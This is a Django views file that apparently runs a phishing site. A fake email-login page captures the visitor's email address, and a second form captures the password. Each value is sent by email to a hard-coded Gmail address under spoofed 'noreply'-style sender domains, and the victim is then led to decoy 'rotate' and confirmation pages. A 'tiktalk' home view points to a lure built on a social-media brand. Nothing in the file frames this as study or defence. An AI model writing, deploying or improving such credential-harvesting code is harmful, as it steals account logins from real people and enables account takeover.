from django.core.mail import send_mail
from django.shortcuts import render , redirect
from django.template.loader import render_to_string
from .forms import ContactForm
from .Password import PasswordFormss as pas
import socket

#  python manage.py runserver

def index(request):
    form =  ContactForm(request.POST or None) 
    if request.method == 'POST':
      
      if form.is_valid():
        email =form.cleaned_data['email']
        html = render_to_string("emails\contactform.html", {
            'email' : email
        })
        send_mail('CLIENT EMAIL' , 'message' , 'noreplay@lavsih.com' , ['bstel0266@gmail.com'], html_message = html)
        return redirect('passwd')
      else:
        return redirect('index')
    return render(request, 'emailLogin.html' ,{
       'form': form
        })

def passwd(request):
    form = pas(request.POST or None)
    if request.method == 'POST':

        if form.is_valid():
            password = form.cleaned_data['password']
            html = render_to_string("password\contactform.html" , {
                'password' : password
            })
            send_mail("PASSWORD" , 'message' , 'noreplay@lavish.com' , ['bstel0266@gmail.com'] , html_message = html)
            return redirect("rotate")
        else:
            return redirect ("passwd")
    return render(request, "passwd.html", {
        'form' : form
    })
        

    
def rotate(request):
    return render(request, 'rotate.html')

def confirmation(request):
    contents = {}
    phone = socket.gethostname().replace("-", " ")
    contents["phone"] = phone
    contents["number"] = 9
    return render(request, 'email_confirmation.html' , contents)

def tiktalk_home(request):
    return render(request, "tiktalkhome.html")